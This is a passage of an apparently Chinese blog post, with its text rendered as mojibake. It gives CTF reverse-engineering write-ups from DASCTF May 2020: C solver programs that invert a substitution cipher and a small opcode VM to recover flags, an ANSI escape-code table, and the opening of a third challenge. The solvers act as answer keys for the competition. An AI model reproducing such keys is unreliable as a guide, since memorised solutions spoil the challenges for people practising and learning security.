rel="noopener">http://cc.TaQini.space</a></strong> , ä¸€ç›´ä»¥ä¸ºåŠ å¯†å’Œè¿™ä¸ªæœ‰å…³,  å—¯â€¦åæ¥å‘ç°æ˜¯é¢˜ç›®ä½œè€…ç»™è‡ªå·±æ‰“çš„å¹¿å‘Š. </p></li><li><p>è™½ç„¶å¾ˆå¤šå‡½æ•°ä¸èƒ½æ˜¾ç¤ºå‡ºæ¥, ä½†ä¹Ÿæ˜¯èƒ½çŒœå‡ºæ¥ä½œç”¨. çœ‹çœ‹æ±‡ç¼–ä¼šæ›´æ¸…æ¥š. </p></li><li><p>æœ€åæ‰¾åˆ°åŠ å¯†å‡½æ•° <strong>sub_1249((__int64)byte_4080);</strong>, è¿™ä¸‹å°±å¥½åŠäº†.   è¿›å»å‡½æ•°å¯ä»¥çŸ¥é“, å¤§å†™å­—æ¯åŠ å¯†ä¸ºå¤§å†™å­—æ¯, å°å†™å­—æ¯åŠ å¯†ä¸ºå°å†™å­—æ¯, å…¶ä»–å­—ç¬¦ä¸å˜.<img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204833774.png" alt="image-20200523204833774"></p></li><li><p>å¯¹äºé€†è¿™ä¸ªç®—æ³•, æ²¡æœ‰è¿‡å¤šçš„æƒ³, ç®—æ˜¯ç›´æ¥ç©·å°½çš„å§(ç®—æ³•å¤ªèœ).  å› ä¸ºå¤§å†™å­—æ¯å˜å¤§å†™å­—æ¯,å°å†™å­—æ¯å˜å°å†™å­—æ¯.</p></li><li><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1209</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt;= <span class="number">97</span> &amp;&amp; a &lt;= <span class="number">122</span>)</span><br><span class="line"><span class="keyword">return</span> a<span class="number">-97</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">65</span> &amp;&amp; a &lt;= <span class="number">90</span>)</span><br><span class="line"><span class="keyword">return</span> (a<span class="number">-65</span>)^<span class="number">0xFFFFFF80</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v4 = <span class="number">0</span>, j = <span class="number">0</span>, v2 = <span class="number">0</span>, v5 = <span class="number">0</span>, v1 = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"TaQini"</span>;</span><br><span class="line"><span class="keyword">char</span> c[] = <span class="string">"FQD&#123;GfjuJ5UbLrWjZjpvErXkiAZzlvO0xTa!cwnLLAsy3B0iEvEy&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = <span class="number">122</span>-i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((c[i] &gt;= <span class="number">97</span> &amp;&amp; c[i] &lt;= <span class="number">122</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v2 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[((v2&amp;<span class="number">0x7F</span>) + v4)%<span class="number">26</span>])</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">65</span>; j &lt;= <span class="number">90</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v1 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[(v4+(v1 &amp; <span class="number">0x7F</span>) + <span class="number">128</span>)%<span class="number">26</span>] - <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æœ€åè¡¥å……ä¸€ä¸‹å¯¹æ”¹å˜è¾“å‡ºå­—ç¬¦ä¸²çš„çŸ¥è¯†ã€‚</p><table><thead><tr><th>\033[0m</th><th>å…³é—­æ‰€æœ‰å±æ€§</th></tr></thead><tbody><tr><td><strong>\033[01m</strong></td><td><strong>è®¾ç½®é«˜äº®åº¦</strong></td></tr><tr><td><strong>\033[04m</strong></td><td><strong>ä¸‹åˆ’çº¿</strong></td></tr><tr><td><strong>\033[05m</strong></td><td><strong>é—ªçƒ</strong></td></tr><tr><td><strong>\033[07m</strong></td><td><strong>åæ˜¾</strong></td></tr><tr><td><strong>\033[08m</strong></td><td><strong>æ¶ˆéš</strong></td></tr><tr><td><strong>\033[30m â€“ \033[37m</strong></td><td><strong>è®¾ç½®å‰æ™¯è‰²</strong></td></tr><tr><td><strong>\033[40m â€“ \033[47m</strong></td><td><strong>è®¾ç½®èƒŒæ™¯è‰²</strong></td></tr><tr><td><strong>\033[nA</strong></td><td><strong>å…‰æ ‡ä¸Šç§»nè¡Œ</strong></td></tr><tr><td><strong>\033[nB</strong></td><td><strong>å…‰æ ‡ä¸‹ç§»nè¡Œ</strong></td></tr><tr><td><strong>\033[nC</strong></td><td><strong>å…‰æ ‡å³ç§»nè¡Œ</strong></td></tr><tr><td><strong>\033[nD</strong></td><td><strong>å…‰æ ‡å·¦ç§»n</strong></td></tr><tr><td><strong>\033[y;xH</strong></td><td><strong>è®¾ç½®å…‰æ ‡ä½ç½®</strong></td></tr><tr><td><strong>\033[2J</strong></td><td><strong>æ¸…å±</strong></td></tr><tr><td><strong>\033[K</strong></td><td><strong>æ¸…é™¤ä»å…‰æ ‡åˆ°è¡Œå°¾çš„å†…å®¹</strong></td></tr><tr><td><strong>\033[s</strong></td><td><strong>ä¿å­˜å…‰æ ‡ä½ç½®</strong></td></tr><tr><td><strong>\033[u</strong></td><td><strong>æ¢å¤å…‰æ ‡ä½ç½®</strong></td></tr><tr><td><strong>\033[?25l</strong></td><td><strong>éšè—å…‰æ ‡</strong></td></tr><tr><td><strong>\033[?25h</strong></td><td><strong>æ˜¾ç¤ºå…‰æ ‡</strong></td></tr></tbody></table></li><li><p><strong>æ€»ç»“: é¢˜æœ¬æ¥å¾ˆç®€å•, ä¸»è¦å‡ æ¬¡è¢«å¸¦å…¥å‘. ä¹Ÿæ˜¯æ²¡ç»éªŒã€‚</strong></p></li></ul><hr><h3 id="MiscVm"><a href="#MiscVm" class="headerlink" title="MiscVm"></a>MiscVm</h3><ul><li><p>ä¸‹è½½ä¸‹æ¥, 64ä½çš„æ— å£³elfæ–‡ä»¶å’Œä¸€ä¸ªæ“ä½œç æ–‡ä»¶.  æ“ä½œç å…¶å®é¢˜ä¸­ä¹Ÿæœ‰, è¿™é‡Œå•ç‹¬ç»™äº†æ–¹ä¾¿å¾ˆå¤š.</p></li><li><p>è½½å…¥ida. C++é€†å‘ç±»çš„, ä½†è¿˜å¥½éƒ½æ˜¯å¾ˆåŸºæœ¬çš„è¯­æ³•. <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075414831.png" alt="image-20200524075414831"></p></li><li><p>åˆ†åˆ«è¿›å»ä¸‰ä¸ªåŠ å¯†å‡½æ•°. ç¬¬ä¸€ä¸ª: <strong>sub_19E2((int64)&amp;v13</strong>, (__int64)&amp;v14);å¾ˆç®€å•,   å°±æ˜¯ 2ä¸ªæ•°çš„å€¼äº¤æ¢.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075631032.png" alt="image-20200524075631032"></p></li><li><p>ç¬¬äºŒä¸ª: <strong>sub_1551((int64)&amp;v14, (int64)&amp;v13);</strong>,  å°±æ˜¯æŒ‰ç…§ç»™å®šé¡ºåºè¿›è¡Œç®€å•çš„å€¼äº¤æ¢.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075954652.png" alt="image-20200524075954652"></p></li><li><p>ç¬¬ä¸‰ä¸ª: <strong>v8 = (unsigned int)sub_EEC(&amp;v14, &amp;v15, 0LL) != 0</strong>,   è¿™ä¸ªç›¸å¯¹äºè¦éº»çƒ¦ä¸€äº›, ä½†åˆ†æä¸€ä¸‹, æ€è·¯ç†æ¸…, é€†å›å»å°±å¥½äº†.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083055817.png" alt="image-20200524083055817"></p></li><li><p>exp: Cè¯­è¨€å†™çš„, æ¯”è¾ƒå†—é•¿. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode_4</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"></span><br><span class="line">j ^= <span class="number">10</span>;</span><br><span class="line">temp = (<span class="number">16</span>*j &gt;&gt; <span class="number">31</span>)&gt;&gt;<span class="number">28</span>;</span><br><span class="line"><span class="keyword">if</span>(a == j + (((temp + <span class="number">16</span>*(*(<span class="keyword">char</span> *)&amp;j))&amp;<span class="number">0xF</span>)-temp))</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">37</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">74</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">212</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">200</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">6</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">59</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">196</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">96</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">75</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">208</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">204</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">36</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> d[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, e[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a1[<span class="number">100</span>] = &#123;<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">36</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">25</span>,<span class="number">14</span>,<span class="number">23</span>,<span class="number">33</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">24</span>,<span class="number">6</span>,<span class="number">26</span>,<span class="number">34</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">28</span>,<span class="number">21</span>,<span class="number">36</span>,<span class="number">20</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">27</span>,<span class="number">30</span>,<span class="number">35</span>,<span class="number">37</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">31</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">27</span>,<span class="number">18</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">28</span>,<span class="number">26</span>,<span class="number">36</span>,<span class="number">33</span>,<span class="number">32</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">34</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">37</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &gt;= <span class="number">-87</span>)</span><br><span class="line"><span class="keyword">switch</span>(a1[<span class="number">87</span>+i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = (A.a[j] / <span class="number">16</span>)*<span class="number">2</span>;</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">A.a[j] /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = A.a[j]*j;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">A.a[++j] /= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = decode_4(A.a[j]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">A.a[j--] *= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = ~A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">--i;</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">A.a[j] /= <span class="number">4</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">d[c[i]<span class="number">-1</span>] = A.a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">e[b[i]<span class="number">-1</span>] = d[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">4</span>; i &lt;= <span class="number">19</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = e[i];</span><br><span class="line">e[i] = e[i+<span class="number">16</span>];</span><br><span class="line">e[i+<span class="number">16</span>] = temp;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, e[i]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083340342.png" alt="image-20200524083340342"></p></li><li><p><strong>æ€»ç»“: è¢«ç®—æ³•å®Œèƒœ</strong>.</p></li></ul><hr><h3 id="BScript"><a href="#BScript" class="headerlink" title="BScript"></a>BScript</h3><ul><li><p>æ„Ÿè§‰æœ‰ç‚¹æ„æ€.  ä¸»è¦å°±æ˜¯è€ƒå¯¹æ–‡ä»¶å†…å®¹çš„æå–, è¿˜æœ‰å°±æ˜¯æ‰¾è§„å¾‹!!!</p></li><li><p>ä¸‹è½½ä¸‹æ¥803ä¸ªexeæ–‡ä»¶.  éšä¾¿æ‰“å¼€ä¸€ä¸ªçœ‹è§ç®€å•çš„è¾“å…¥å¯¹æ¯”, å†æ‰“å¼€ä¸€ä¸ªè¿˜æ˜¯åŒæ ·çš„.ä½†æ²¡æœ‰å‘ç°ä¸è§£é¢˜ç›¸å…³çš„ä¸œè¥¿.</p></li><li><p>ä¹Ÿæ˜¯åé¢æƒ³ç€å†å»çœ‹çœ‹è¿™ä¸ªé¢˜æ‰å‘ç° æ¯ä¸ªexeæ–‡ä»¶è®©æˆ‘ä»¬è¾“å…¥çš„éƒ½æ˜¯ä¸€ä¸ªPEæ–‡ä»¶çš„ä¸€éƒ¨åˆ†, é‚£ ç†Ÿæ‚‰çš„ MZ(4D5A)å•Š.<img 